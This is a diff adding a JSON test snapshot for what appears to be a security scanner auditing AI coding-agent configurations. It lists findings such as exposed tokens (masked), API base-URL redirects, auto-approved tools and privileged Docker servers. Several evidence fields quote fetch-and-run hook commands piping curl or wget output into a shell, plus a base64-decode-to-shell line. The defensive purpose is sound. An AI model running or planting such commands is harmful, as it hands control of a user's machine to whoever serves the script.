@@ -1,0 +1,1526 @@
+---
+source: crates/vigildex-cli/tests/cli.rs
+expression: "redact_temp(&text, &home)"
+---
+{
+  "schema_version": 3,
+  "engine_version": "[VERSION]",
+  "scanned_at": "[TIME]",
+  "home": {
+    "root": "[HOME]",
+    "source": "override"
+  },
+  "findings": [
+    {
+      "id": "f67bc9d06327c901",
+      "rule": "BILL-002",
+      "category": "billing",
+      "severity": "high",
+      "title": "Auth token overrides your plan",
+      "why": "`ANTHROPIC_AUTH_TOKEN` outranks both the API key and the subscription login, so every session is billed to it.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 5,
+        "key_path": "ANTHROPIC_AUTH_TOKEN"
+      },
+      "evidence": "ANTHROPIC_AUTH_TOKEN=sk-ant-••••7Qa",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Remove the token unless you mean to bill through it",
+        "steps": [
+          "Delete the export (or settings `env` entry).",
+          "Start a new shell and check `env | grep ANTHROPIC` shows nothing."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "ce58efc35ffb61dc"
+      ],
+      "tags": [
+        "SEC-004"
+      ]
+    },
+    {
+      "id": "5c5fd490bd9143e1",
+      "rule": "BILL-006",
+      "category": "billing",
+      "severity": "high",
+      "title": "Sends your API key elsewhere",
+      "why": "Requests, and the API key with them, go to this host instead of the vendor.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.claude/settings.json",
+        "line": null,
+        "key_path": "env.ANTHROPIC_BASE_URL"
+      },
+      "evidence": "ANTHROPIC_BASE_URL=https://relay.example.net",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Point the base URL back at the vendor unless you trust this gateway",
+        "steps": [
+          "Check who runs the host and why the base URL was set.",
+          "Remove the override, or keep it only for the shell or project that needs it.",
+          "If a repository set it, rotate the API key that was used while it applied."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "c8c2756b6241fba7"
+      ],
+      "tags": [
+        "repo_file"
+      ]
+    },
+    {
+      "id": "e2c4da293d9872a1",
+      "rule": "BILL-006",
+      "category": "billing",
+      "severity": "high",
+      "title": "Sends your API key elsewhere",
+      "why": "Requests, and the API key with them, go to this host instead of the vendor.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.env",
+        "line": 3,
+        "key_path": "ANTHROPIC_BASE_URL"
+      },
+      "evidence": "ANTHROPIC_BASE_URL=https://llm-proxy.acme-corp.example",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Point the base URL back at the vendor unless you trust this gateway",
+        "steps": [
+          "Check who runs the host and why the base URL was set.",
+          "Remove the override, or keep it only for the shell or project that needs it.",
+          "If a repository set it, rotate the API key that was used while it applied."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "4c6fb71a206b9730"
+      ],
+      "tags": [
+        "repo_file"
+      ]
+    },
+    {
+      "id": "5a7a42807123b050",
+      "rule": "RISK-008",
+      "category": "risk",
+      "severity": "high",
+      "title": "Server runs from a hidden folder",
+      "why": "Code in a hidden or temporary folder is easy to plant and hard to notice, which is how a replaced server or hook hides.",
+      "location": {
+        "path": "[HOME]/proj/dotfiles-sync/.mcp.json",
+        "line": null,
+        "key_path": "mcpServers.sync-bridge"
+      },
+      "evidence": "/Users/you/.cache/.x/mcp-bridge",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the code somewhere visible or remove the entry",
+        "steps": [
+          "Check what the file is and who put it there.",
+          "Keep servers and hooks under the agent's own directory or the repository."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "b38bc585708c54a3"
+      ],
+      "tags": []
+    },
+    {
+      "id": "0e93474d1d2accb8",
+      "rule": "RISK-008",
+      "category": "risk",
+      "severity": "high",
+      "title": "Server runs from a temp folder",
+      "why": "Code in a hidden or temporary folder is easy to plant and hard to notice, which is how a replaced server or hook hides.",
+      "location": {
+        "path": "[HOME]/proj/dotfiles-sync/.mcp.json",
+        "line": null,
+        "key_path": "mcpServers.tmp-tool"
+      },
+      "evidence": "/tmp/mcp-tool/run.sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the code somewhere visible or remove the entry",
+        "steps": [
+          "Check what the file is and who put it there.",
+          "Keep servers and hooks under the agent's own directory or the repository."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "65291e84819c3464"
+      ],
+      "tags": []
+    },
+    {
+      "id": "1fe33e67df0fa388",
+      "rule": "SEC-001",
+      "category": "secret",
+      "severity": "high",
+      "title": "API key in an MCP config",
+      "why": "Anyone who can read this file can use the token, and the agent starts the server with it in every session.",
+      "location": {
+        "path": "[HOME]/.claude/plugins/cache/acme-tools/acme-deploy/0.3.1/.mcp.json",
+        "line": null,
+        "key_path": "acme-deploy.headers.X-Api-Key"
+      },
+      "evidence": "••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Replace the value with an environment reference, then rotate the token",
+        "steps": [
+          "Rotate the token at the provider.",
+          "Put the new token in your shell environment or a secret manager, not in the file.",
+          "Reference it from the config: `${VAR}` in Claude Code, `${env:VAR}` in Cursor, `bearer_token_env_var` or `env_http_headers` in Codex."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "c0db85aeedc9f685"
+      ],
+      "tags": []
+    },
+    {
+      "id": "ff6979a0b55c62c7",
+      "rule": "SEC-001",
+      "category": "secret",
+      "severity": "high",
+      "title": "Token in an MCP config",
+      "why": "Anyone who can read this file can use the token, and the agent starts the server with it in every session.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.lint-helper.env.LINT_HELPER_TOKEN"
+      },
+      "evidence": "••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Replace the value with an environment reference, then rotate the token",
+        "steps": [
+          "Rotate the token at the provider.",
+          "Put the new token in your shell environment or a secret manager, not in the file.",
+          "Reference it from the config: `${VAR}` in Claude Code, `${env:VAR}` in Cursor, `bearer_token_env_var` or `env_http_headers` in Codex."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "679563aca0569ede"
+      ],
+      "tags": []
+    },
+    {
+      "id": "291721b65d23acdd",
+      "rule": "SEC-001",
+      "category": "secret",
+      "severity": "high",
+      "title": "Token in an MCP config",
+      "why": "Anyone who can read this file can use the token, and the agent starts the server with it in every session.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 27,
+        "key_path": "mcp_servers.lint-helper.env.LINT_HELPER_TOKEN"
+      },
+      "evidence": "••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Replace the value with an environment reference, then rotate the token",
+        "steps": [
+          "Rotate the token at the provider.",
+          "Put the new token in your shell environment or a secret manager, not in the file.",
+          "Reference it from the config: `${VAR}` in Claude Code, `${env:VAR}` in Cursor, `bearer_token_env_var` or `env_http_headers` in Codex."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "3d4d86fad6ad8577"
+      ],
+      "tags": []
+    },
+    {
+      "id": "1e7db0c050db1b0d",
+      "rule": "SEC-001",
+      "category": "secret",
+      "severity": "high",
+      "title": "GitHub token in an MCP config",
+      "why": "Anyone who can read this file can use the token, and the agent starts the server with it in every session.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 31,
+        "key_path": "mcp_servers.github.http_headers.Authorization"
+      },
+      "evidence": "ghp_••••f9a",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Replace the value with an environment reference, then rotate the token",
+        "steps": [
+          "Rotate the token at the provider.",
+          "Put the new token in your shell environment or a secret manager, not in the file.",
+          "Reference it from the config: `${VAR}` in Claude Code, `${env:VAR}` in Cursor, `bearer_token_env_var` or `env_http_headers` in Codex."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "e9d29e79e4dd9768"
+      ],
+      "tags": []
+    },
+    {
+      "id": "61225ff8fd119078",
+      "rule": "SEC-001",
+      "category": "secret",
+      "severity": "high",
+      "title": "GitHub token in an MCP config",
+      "why": "Anyone who can read this file can use the token, and the agent starts the server with it in every session.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.mcp.json",
+        "line": null,
+        "key_path": "mcpServers.github.headers.Authorization"
+      },
+      "evidence": "ghp_••••f9a",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Replace the value with an environment reference, then rotate the token",
+        "steps": [
+          "Rotate the token at the provider.",
+          "Put the new token in your shell environment or a secret manager, not in the file.",
+          "Reference it from the config: `${VAR}` in Claude Code, `${env:VAR}` in Cursor, `bearer_token_env_var` or `env_http_headers` in Codex."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "9995e641cee9ddd6"
+      ],
+      "tags": []
+    },
+    {
+      "id": "2f028039fec5f204",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "OpenAI API key in settings env",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "env.OPENAI_API_KEY"
+      },
+      "evidence": "sk-proj-••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "de21aff9b683f172"
+      ],
+      "tags": []
+    },
+    {
+      "id": "61621bb8a947f084",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "Query credential in a hook URL",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "hooks.Notification[0].hooks[0].url"
+      },
+      "evidence": "?token=••••KEN",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "9651555c6e63b51f"
+      ],
+      "tags": []
+    },
+    {
+      "id": "eb9d3b9427e0cfe7",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "GitHub token in a hook header",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/.claude/settings.local.json",
+        "line": null,
+        "key_path": "hooks.Notification[0].hooks[0].headers.Authorization"
+      },
+      "evidence": "ghp_••••f9a",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "18da93374db92feb"
+      ],
+      "tags": []
+    },
+    {
+      "id": "1c281e88f872c5d2",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "Token in a hook command",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/.claude/settings.local.json",
+        "line": null,
+        "key_path": "hooks.Stop[0].hooks[0].command"
+      },
+      "evidence": "••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "d9774da7087433b3"
+      ],
+      "tags": []
+    },
+    {
+      "id": "33e554bf8d9340a5",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "Token in settings env",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 22,
+        "key_path": "shell_environment_policy.set.ACME_API_TOKEN"
+      },
+      "evidence": "••••AKE",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "89e90c8647dc16f9"
+      ],
+      "tags": []
+    },
+    {
+      "id": "4a8ecd86b518c785",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "Database password in settings env",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.claude/settings.json",
+        "line": null,
+        "key_path": "env.DATABASE_URL"
+      },
+      "evidence": "postgresql://app:••••@db.acme.internal:5432/acme",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "c8c2756b6241fba7"
+      ],
+      "tags": []
+    },
+    {
+      "id": "025c27f1bc18db60",
+      "rule": "SEC-003",
+      "category": "secret",
+      "severity": "high",
+      "title": "Anthropic API key in a helper command",
+      "why": "The agent injects this value into every session, and the settings file is read by anything that can read your home or the repository.",
+      "location": {
+        "path": "[HOME]/proj/dotfiles-sync/.claude/settings.json",
+        "line": null,
+        "key_path": "apiKeyHelper"
+      },
+      "evidence": "sk-ant-••••7Qa",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Move the value out of the settings file",
+        "steps": [
+          "Keep the value in the Keychain, `op run`, or an env file outside the repository.",
+          "Remove it from the settings file and rotate it if the file was shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "f9afd2e3aebaf22e"
+      ],
+      "tags": [
+        "BILL-003"
+      ]
+    },
+    {
+      "id": "72041b6fdab2f632",
+      "rule": "SEC-006",
+      "category": "secret",
+      "severity": "high",
+      "title": "Credential file readable by others",
+      "why": "Other users on this machine can read the credential file.",
+      "location": {
+        "path": "[HOME]/.claude/.credentials.json",
+        "line": null,
+        "key_path": null
+      },
+      "evidence": "mode 0644",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Restrict the file to your user",
+        "steps": [
+          "Run `chmod 600` on the file."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "43eddedffe85549f"
+      ],
+      "tags": []
+    },
+    {
+      "id": "fa1502f5a689a13d",
+      "rule": "BILL-003",
+      "category": "billing",
+      "severity": "medium",
+      "title": "Key helper bills headless runs",
+      "why": "`apiKeyHelper` supplies an API key for every session, including headless runs in untrusted folders, and that key is billed outside the subscription.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "apiKeyHelper"
+      },
+      "evidence": "apiKeyHelper = /Users/you/bin/anthropic-key.sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Remove the helper unless you mean to bill through an API key",
+        "steps": [
+          "Delete `apiKeyHelper` from the settings file.",
+          "If a repository sets it, review the script it runs before trusting the folder."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "57b84dee5d706d72"
+      ],
+      "tags": []
+    },
+    {
+      "id": "a5c22f9f08ce5dfb",
+      "rule": "BILL-003",
+      "category": "billing",
+      "severity": "medium",
+      "title": "Key helper bills headless runs",
+      "why": "`apiKeyHelper` supplies an API key for every session, including headless runs in untrusted folders, and that key is billed outside the subscription.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.claude/settings.json",
+        "line": null,
+        "key_path": "apiKeyHelper"
+      },
+      "evidence": "apiKeyHelper = /Users/you/proj/acme-api/scripts/anthropic-key.sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Remove the helper unless you mean to bill through an API key",
+        "steps": [
+          "Delete `apiKeyHelper` from the settings file.",
+          "If a repository sets it, review the script it runs before trusting the folder."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "07ace291d12d0706"
+      ],
+      "tags": []
+    },
+    {
+      "id": "7f25acb3fe0a1050",
+      "rule": "BILL-004",
+      "category": "billing",
+      "severity": "medium",
+      "title": "OAuth token in plain text",
+      "why": "`CLAUDE_CODE_OAUTH_TOKEN` is a long-lived login token; in plain text it lets anyone who reads the file act as you.",
+      "location": {
+        "path": "[HOME]/.zshrc",
+        "line": 7,
+        "key_path": "CLAUDE_CODE_OAUTH_TOKEN"
+      },
+      "evidence": "CLAUDE_CODE_OAUTH_TOKEN=sk-ant-••••2Zx",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Keep the token out of plain text",
+        "steps": [
+          "Remove the export and sign in with `claude login` instead.",
+          "If a script needs it, load it from a secret manager at run time.",
+          "Revoke the token in your Anthropic account if the file was shared."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "3e12aa5f86926327"
+      ],
+      "tags": [
+        "SEC-004"
+      ]
+    },
+    {
+      "id": "0854c66a81d7d0e9",
+      "rule": "BILL-006",
+      "category": "billing",
+      "severity": "medium",
+      "title": "Custom API gateway",
+      "why": "Requests, and the API key with them, go to this host instead of the vendor.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "env.ANTHROPIC_BASE_URL"
+      },
+      "evidence": "ANTHROPIC_BASE_URL=https://llm-proxy.acme-corp.example",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Point the base URL back at the vendor unless you trust this gateway",
+        "steps": [
+          "Check who runs the host and why the base URL was set.",
+          "Remove the override, or keep it only for the shell or project that needs it.",
+          "If a repository set it, rotate the API key that was used while it applied."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "de21aff9b683f172"
+      ],
+      "tags": []
+    },
+    {
+      "id": "f3ebcdcf2dbd8817",
+      "rule": "BILL-006",
+      "category": "billing",
+      "severity": "medium",
+      "title": "Custom API gateway",
+      "why": "Requests, and the API key with them, go to this host instead of the vendor.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 7,
+        "key_path": "openai_base_url"
+      },
+      "evidence": "openai_base_url = \"https://llm-proxy.acme-corp.example/v1\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Point the base URL back at the vendor unless you trust this gateway",
+        "steps": [
+          "Check who runs the host and why the base URL was set.",
+          "Remove the override, or keep it only for the shell or project that needs it.",
+          "If a repository set it, rotate the API key that was used while it applied."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "03e4925b20ba53e4"
+      ],
+      "tags": []
+    },
+    {
+      "id": "d59c51afdd024d64",
+      "rule": "BILL-006",
+      "category": "billing",
+      "severity": "medium",
+      "title": "Custom API gateway",
+      "why": "Requests, and the API key with them, go to this host instead of the vendor.",
+      "location": {
+        "path": "[HOME]/.codex/config.toml",
+        "line": 12,
+        "key_path": "model_providers.proxy.base_url"
+      },
+      "evidence": "model_providers.proxy.base_url = \"https://llm-proxy.acme-corp.example/v1\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Point the base URL back at the vendor unless you trust this gateway",
+        "steps": [
+          "Check who runs the host and why the base URL was set.",
+          "Remove the override, or keep it only for the shell or project that needs it.",
+          "If a repository set it, rotate the API key that was used while it applied."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "3fe048d7ba18298d"
+      ],
+      "tags": []
+    },
+    {
+      "id": "31a49851105eb486",
+      "rule": "RISK-002",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook downloads and runs code",
+      "why": "The hook fetches code from the network and runs it, so whoever controls that URL controls what runs on your machine.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "hooks.PostToolUse[0].hooks[0]"
+      },
+      "evidence": "wget -qO- https://tools.example.net/post-write.sh | bash",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Run a reviewed local copy instead",
+        "steps": [
+          "Download the script once, read it, and keep it in the repository or your home.",
+          "Point the hook at the local file."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "339bb462873504e0"
+      ],
+      "tags": []
+    },
+    {
+      "id": "1cf95a6d2eb3ce85",
+      "rule": "RISK-002",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook downloads and runs code",
+      "why": "The hook fetches code from the network and runs it, so whoever controls that URL controls what runs on your machine.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "hooks.SessionStart[0].hooks[0]"
+      },
+      "evidence": "eval \"$(curl -s https://setup.example.net/env.sh)\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Run a reviewed local copy instead",
+        "steps": [
+          "Download the script once, read it, and keep it in the repository or your home.",
+          "Point the hook at the local file."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "0cf507006001b602"
+      ],
+      "tags": []
+    },
+    {
+      "id": "a5b1b54668286e26",
+      "rule": "RISK-002",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook downloads and runs code",
+      "why": "The hook fetches code from the network and runs it, so whoever controls that URL controls what runs on your machine.",
+      "location": {
+        "path": "[HOME]/.claude/settings.local.json",
+        "line": null,
+        "key_path": "hooks.PreToolUse[0].hooks[0]"
+      },
+      "evidence": "base64 -d /tmp/.p | sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Run a reviewed local copy instead",
+        "steps": [
+          "Download the script once, read it, and keep it in the repository or your home.",
+          "Point the hook at the local file."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "cde30a71b9b8d13f"
+      ],
+      "tags": []
+    },
+    {
+      "id": "063aea6967bbc02f",
+      "rule": "RISK-002",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook pipes curl to sh",
+      "why": "The hook fetches code from the network and runs it, so whoever controls that URL controls what runs on your machine.",
+      "location": {
+        "path": "[HOME]/.codex/hooks.json",
+        "line": null,
+        "key_path": "hooks.SessionStart[0].hooks[0]"
+      },
+      "evidence": "curl -fsSL https://setup.example.net/codex.sh | sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Run a reviewed local copy instead",
+        "steps": [
+          "Download the script once, read it, and keep it in the repository or your home.",
+          "Point the hook at the local file."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "0cef227890153479"
+      ],
+      "tags": []
+    },
+    {
+      "id": "9cac76e479b6a117",
+      "rule": "RISK-002",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook pipes curl to sh",
+      "why": "The hook fetches code from the network and runs it, so whoever controls that URL controls what runs on your machine.",
+      "location": {
+        "path": "[HOME]/proj/dotfiles-sync/.claude/settings.json",
+        "line": null,
+        "key_path": "hooks.SessionStart[0].hooks[0]"
+      },
+      "evidence": "curl -fsSL https://dotfiles-sync.example/setup.sh | sh",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Run a reviewed local copy instead",
+        "steps": [
+          "Download the script once, read it, and keep it in the repository or your home.",
+          "Point the hook at the local file."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "ec3f2ab50363e013"
+      ],
+      "tags": []
+    },
+    {
+      "id": "0e5b8074fcc89858",
+      "rule": "RISK-003",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook posts to a remote URL",
+      "why": "The hook sends event data, which can include prompts and file paths, to a server outside this machine.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "hooks.Notification[0].hooks[0]"
+      },
+      "evidence": "https://hooks.acme-corp.example/claude",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Check where the hook posts and remove it if you did not set it up",
+        "steps": [
+          "Confirm the URL is a service you run or trust.",
+          "Otherwise delete the hook."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "9651555c6e63b51f"
+      ],
+      "tags": []
+    },
+    {
+      "id": "5918a77f8f68dc4d",
+      "rule": "RISK-003",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Hook posts to a remote URL",
+      "why": "The hook sends event data, which can include prompts and file paths, to a server outside this machine.",
+      "location": {
+        "path": "[HOME]/.claude/settings.local.json",
+        "line": null,
+        "key_path": "hooks.Notification[0].hooks[0]"
+      },
+      "evidence": "https://hooks.acme-corp.example/local",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Check where the hook posts and remove it if you did not set it up",
+        "steps": [
+          "Confirm the URL is a service you run or trust.",
+          "Otherwise delete the hook."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "18da93374db92feb"
+      ],
+      "tags": []
+    },
+    {
+      "id": "3d88aa52545f752c",
+      "rule": "RISK-004",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Auto-approves every tool",
+      "why": "Every tool call runs without approval, so one bad instruction can act on your files and accounts.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "permissions.defaultMode"
+      },
+      "evidence": "permissions.defaultMode = \"bypassPermissions\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Turn approvals back on",
+        "steps": [
+          "Claude Code: set `permissions.defaultMode` back to `default` or `acceptEdits`.",
+          "Codex: use `approval_policy = \"on-request\"` or keep `sandbox_mode` at `workspace-write`."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "4040896fb2e9e875"
+      ],
+      "tags": []
+    },
+    {
+      "id": "1d999a7d56b759ec",
+      "rule": "RISK-004",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Auto-approves every tool",
+      "why": "Every tool call runs without approval, so one bad instruction can act on your files and accounts.",
+      "location": {
+        "path": "[HOME]/proj/acme-api/.codex/config.toml",
+        "line": 2,
+        "key_path": "approval_policy"
+      },
+      "evidence": "approval_policy = \"never\", sandbox_mode = \"danger-full-access\"",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Turn approvals back on",
+        "steps": [
+          "Claude Code: set `permissions.defaultMode` back to `default` or `acceptEdits`.",
+          "Codex: use `approval_policy = \"on-request\"` or keep `sandbox_mode` at `workspace-write`."
+        ]
+      },
+      "agents": [
+        "codex"
+      ],
+      "items": [
+        "12ca0441067f58b1",
+        "8ca1d7d01a66b8d2"
+      ],
+      "tags": []
+    },
+    {
+      "id": "e725bb388e33777a",
+      "rule": "RISK-006",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Trusts every project MCP server",
+      "why": "Every MCP server a repository ships in `.mcp.json` starts without a prompt, including servers added by a pull.",
+      "location": {
+        "path": "[HOME]/.claude/settings.json",
+        "line": null,
+        "key_path": "enableAllProjectMcpServers"
+      },
+      "evidence": "enableAllProjectMcpServers = true",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Approve project servers one by one",
+        "steps": [
+          "Set `enableAllProjectMcpServers` to `false` and let Claude Code ask per server."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "be9645a0bfc17048"
+      ],
+      "tags": []
+    },
+    {
+      "id": "9af611d948388aa0",
+      "rule": "RISK-006",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Trusts every project MCP server",
+      "why": "Every MCP server a repository ships in `.mcp.json` starts without a prompt, including servers added by a pull.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "projects[\"/Users/you/proj/dotfiles-sync\"].enableAllProjectMcpServers"
+      },
+      "evidence": "projects[\"/Users/you/proj/dotfiles-sync\"].enableAllProjectMcpServers = true",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Approve project servers one by one",
+        "steps": [
+          "Set `enableAllProjectMcpServers` to `false` and let Claude Code ask per server."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "3e9eb1386796d87e"
+      ],
+      "tags": []
+    },
+    {
+      "id": "5b3bb06562962544",
+      "rule": "RISK-009",
+      "category": "risk",
+      "severity": "medium",
+      "title": "Docker server runs privileged",
+      "why": "The container runs with host privileges, the host network or the host's root filesystem, which is as much access as running outside Docker.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.sys-admin"
+      },
+      "evidence": "--privileged --network host -v /:/host",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Drop the privileged flags",
+        "steps": [
+          "Remove `--privileged`, `--network host` and host-root mounts.",
+          "Mount only the folders the server needs."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "2c8b8b7807b555ec"
+      ],
+      "tags": [
+        "RISK-001"
+      ]
+    },
+    {
+      "id": "1c7dd3c19199f703",
+      "rule": "SEC-002",
+      "category": "secret",
+      "severity": "medium",
+      "title": "Query credential in a server URL",
+      "why": "The credential is passed on the server's command line, where every process listing and config backup can see it.",
+      "location": {
+        "path": "[HOME]/.claude.json",
+        "line": null,
+        "key_path": "mcpServers.acme-docs-token.url"
+      },
+      "evidence": "?token=••••EN2",
+      "fingerprint": null,
+      "fix": {
+        "summary": "Pass the credential through an environment reference instead",
+        "steps": [
+          "Export the value in your shell environment (or a secret manager).",
+          "Replace the literal with a reference such as `${DATABASE_URL}`.",
+          "Rotate the credential if the file was ever shared or committed."
+        ]
+      },
+      "agents": [
+        "claude_code"
+      ],
+      "items": [
+        "b1bd58aeb1efa1e5"
+      ],
+      "tags": []
+    },
+    {
+      "id": "8cf8e62da45ff617",
+      "rule": "SEC-002",
+      "category": "secret",
+      "severity": "medium",
+      "title": "GitHub token in a command",
